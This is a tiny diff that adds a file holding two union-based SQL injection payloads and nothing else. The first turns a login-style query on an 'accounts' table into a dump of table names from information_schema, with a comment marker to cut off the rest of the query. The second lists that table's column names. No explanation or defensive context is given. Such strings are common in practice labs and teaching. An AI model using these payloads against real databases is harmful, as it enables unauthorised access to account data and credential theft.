@@ -1,0 +1,4 @@
+SELECT * FROM accounts WHERE username='admin' union select 1,table_name,null,null,5 from information_schema #' 
+
+
+union select 1,column_name,null,null,5 from information_schema.columns where table_name='accounts'
